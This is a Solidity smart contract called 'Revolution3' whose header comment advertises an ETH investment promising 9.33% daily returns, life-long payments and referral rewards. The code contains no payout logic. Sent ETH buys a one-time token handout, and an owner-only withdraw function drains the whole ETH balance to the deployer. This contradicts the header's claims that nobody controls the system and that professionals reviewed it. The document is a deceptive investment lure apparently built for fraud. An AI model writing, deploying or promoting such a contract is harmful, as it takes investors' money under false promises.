1 pragma solidity ^0.4.22;
2 
3 /**
4 *
5 * ETH CRYPTOCURRENCY DISTRIBUTION PROJECT v 3.0
6 * ---How to use:
7 *  1. Send from ETH wallet to the smart contract address 0x6D6daf7dab8199cd018b8EA0EfbA2067930b18Df
8 *     any amount from 0.01 ETH.
9 *  2. Verify your transaction in the history of your application or etherscan.io, specifying the address 
10 *     of your wallet.
11 *  3a. Claim your profit by sending 0 ether transaction (every 10 min, every day, every week, i don't care unless you're 
12 *      spending too much on GAS)
13 *  OR
14 *  3b. For reinvest, you need to deposit the amount that you want to reinvest and the 
15 *      accrued interest automatically summed to your new contribution.
16 * 
17 *  4. You Receive Ticket Invest Ethereum 
18 * 
19 * 
20 *  - GAIN 9,33% - 1% PER 24 HOURS (interest is charges in equal parts every 10 min)
21 *  - Life-long payments
22 *  - The revolutionary reliability
23 *  - Minimal contribution 0.01 eth
24 *  - Currency and payment - ETH
25 *  - Contribution allocation schemes:
26 *    -- 87,5% payments
27 *    --  7,5% marketing
28 *    --  5,0% technical support
29 *
30 *   ---About the Project Revolution3
31 *  Blockchain-enabled smart contracts have opened a new era of trustless relationships without 
32 *  intermediaries. This technology opens incredible financial possibilities. Our automated investment 
33 *  distribution model is written into a smart contract, uploaded to the Ethereum blockchain and can be 
34 *  freely accessed online. In order to insure our investors' complete security, full control over the 
35 *  project has been transferred from the organizers to the smart contract: nobody can influence the 
36 *  system's permanent autonomous functioning.
37 * 
38 * ---How to use:
39 *  1. Send from ETH wallet to the smart contract address 0x6D6daf7dab8199cd018b8EA0EfbA2067930b18Df
40 *     any amount from 0.01 ETH.
41 *  2. Verify your transaction in the history of your application or etherscan.io, specifying the address 
42 *     of your wallet.
43 *  3a. Claim your profit by sending 0 ether transaction (every 10 min, every day, every week, i don't care unless you're 
44 *      spending too much on GAS)
45 *  OR
46 *  3b. For reinvest, you need to deposit the amount that you want to reinvest and the 
47 *      accrued interest automatically summed to your new contribution.
48 * 
49 *  4. You Receive Ticket Invest Ethereum 
50 *  
51 * RECOMMENDED GAS LIMIT: 200000
52 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
53 * You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.
54 *
55 * ---Refferral system:
56 *     from 0 to 10.000 ethers in the fund - remuneration to each contributor is 3.33%, 
57 *     from 10.000 to 100.000 ethers in the fund - remuneration will be 2%, 
58 *     from 100.000 ethers in the fund - each contributor will get 1%.
59 *
60 * ---It is not allowed to transfer from exchanges, only from your personal ETH wallet, for which you 
61 * have private keys.
62 * 
63 * Contracts reviewed and approved by pros!
64 * 
65 * Main contract - Revolution3. Scroll down to find it.
66 */ 
67 
68 
69 library SafeMath {
70   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
71     uint256 c = a * b;
72     assert(a == 0 || c / a == b);
73     return c;
74   }
75 
76   function div(uint256 a, uint256 b) internal pure returns (uint256) {
77     uint256 c = a / b;
78     return c;
79   }
80 
81   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
82     assert(b <= a);
83     return a - b;
84   }
85 
86   function add(uint256 a, uint256 b) internal pure returns (uint256) {
87     uint256 c = a + b;
88     assert(c >= a);
89     return c;
90   }
91 }
92 
93 contract ForeignToken {
94     function balanceOf(address _owner) constant public returns (uint256);
95     function transfer(address _to, uint256 _value) public returns (bool);
96 }
97 
98 contract ERC20Basic {
99     uint256 public totalSupply;
100     function balanceOf(address who) public constant returns (uint256);
101     function transfer(address to, uint256 value) public returns (bool);
102     event Transfer(address indexed from, address indexed to, uint256 value);
103 }
104 
105 contract ERC20 is ERC20Basic {
106     function allowance(address owner, address spender) public constant returns (uint256);
107     function transferFrom(address from, address to, uint256 value) public returns (bool);
108     function approve(address spender, uint256 value) public returns (bool);
109     event Approval(address indexed owner, address indexed spender, uint256 value);
110 }
111 
112 interface Token { 
113     function distr(address _to, uint256 _value) external returns (bool);
114     function totalSupply() constant external returns (uint256 supply);
115     function balanceOf(address _owner) constant external returns (uint256 balance);
116 }
117 
118 contract Revolution3 is ERC20 {
119 
120  
121     
122     using SafeMath for uint256;
123     address owner = msg.sender;
124 
125     mapping (address => uint256) balances;
126     mapping (address => mapping (address => uint256)) allowed;
127     mapping (address => bool) public blacklist;
128 
129     string public constant name = "Revolution3";
130     string public constant symbol = "Ticket Invest R3";
131     uint public constant decimals = 18;
132     
133 uint256 public totalSupply = 30000000000e18;
134     
135 uint256 public totalDistributed = 15000000000e18;
136     
137 uint256 public totalRemaining = totalSupply.sub(totalDistributed);
138     
139 uint256 public value = 15e18;
140 
141 
142 
143     event Transfer(address indexed _from, address indexed _to, uint256 _value);
144     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
145     
146     event Distr(address indexed to, uint256 amount);
147     event DistrFinished();
148     
149     event Burn(address indexed burner, uint256 value);
150 
151     bool public distributionFinished = false;
152     
153     modifier canDistr() {
154         require(!distributionFinished);
155         _;
156     }
157     
158     modifier onlyOwner() {
159         require(msg.sender == owner);
160         _;
161     }
162     
163     modifier onlyWhitelist() {
164         require(blacklist[msg.sender] == false);
165         _;
166     }
167     
168     function Revolution3() public {
169         owner = msg.sender;
170         balances[owner] = totalDistributed;
171     }
172     
173     function transferOwnership(address newOwner) onlyOwner public {
174         if (newOwner != address(0)) {
175             owner = newOwner;
176         }
177     }
178     
179     function finishDistribution() onlyOwner canDistr public returns (bool) {
180         distributionFinished = true;
181         emit DistrFinished();
182         return true;
183     }
184     
185     function distr(address _to, uint256 _amount) canDistr private returns (bool) {
186         totalDistributed = totalDistributed.add(_amount);
187         totalRemaining = totalRemaining.sub(_amount);
188         balances[_to] = balances[_to].add(_amount);
189         emit Distr(_to, _amount);
190         emit Transfer(address(0), _to, _amount);
191         return true;
192         
193         if (totalDistributed >= totalSupply) {
194             distributionFinished = true;
195         }
196     }
197     
198     function () external payable {
199         getTokens();
200      }
201     
202     function getTokens() payable canDistr onlyWhitelist public {
203         if (value > totalRemaining) {
204             value = totalRemaining;
205         }
206         
207         require(value <= totalRemaining);
208         
209         address investor = msg.sender;
210         uint256 toGive = value;
211         
212         distr(investor, toGive);
213         
214         if (toGive > 0) {
215             blacklist[investor] = true;
216         }
217 
218         if (totalDistributed >= totalSupply) {
219             distributionFinished = true;
220         }
221         
222         value = value.div(100000).mul(99999);
223     }
224 
225     function balanceOf(address _owner) constant public returns (uint256) {
226         return balances[_owner];
227     }
228 
229     modifier onlyPayloadSize(uint size) {
230         assert(msg.data.length >= size + 4);
231         _;
232     }
233     
234     function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
235         require(_to != address(0));
236         require(_amount <= balances[msg.sender]);
237         
238         balances[msg.sender] = balances[msg.sender].sub(_amount);
239         balances[_to] = balances[_to].add(_amount);
240         emit Transfer(msg.sender, _to, _amount);
241         return true;
242     }
243     
244     function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
245         require(_to != address(0));
246         require(_amount <= balances[_from]);
247         require(_amount <= allowed[_from][msg.sender]);
248         
249         balances[_from] = balances[_from].sub(_amount);
250         allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
251         balances[_to] = balances[_to].add(_amount);
252         emit Transfer(_from, _to, _amount);
253         return true;
254     }
255     
256     function approve(address _spender, uint256 _value) public returns (bool success) {
257         if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
258         allowed[msg.sender][_spender] = _value;
259         emit Approval(msg.sender, _spender, _value);
260         return true;
261     }
262     
263     function allowance(address _owner, address _spender) constant public returns (uint256) {
264         return allowed[_owner][_spender];
265     }
266     
267     function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
268         ForeignToken t = ForeignToken(tokenAddress);
269         uint bal = t.balanceOf(who);
270         return bal;
271     }
272     
273     function withdraw() onlyOwner public {
274         uint256 etherBalance = address(this).balance;
275         owner.transfer(etherBalance);
276     }
277     
278     function burn(uint256 _value) onlyOwner public {
279         require(_value <= balances[msg.sender]);
280 
281         address burner = msg.sender;
282         balances[burner] = balances[burner].sub(_value);
283         totalSupply = totalSupply.sub(_value);
284         totalDistributed = totalDistributed.sub(_value);
285         emit Burn(burner, _value);
286     }
287     
288     function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
289         ForeignToken token = ForeignToken(_tokenContract);
290         uint256 amount = token.balanceOf(address(this));
291         return token.transfer(owner, amount);
292     }
293 }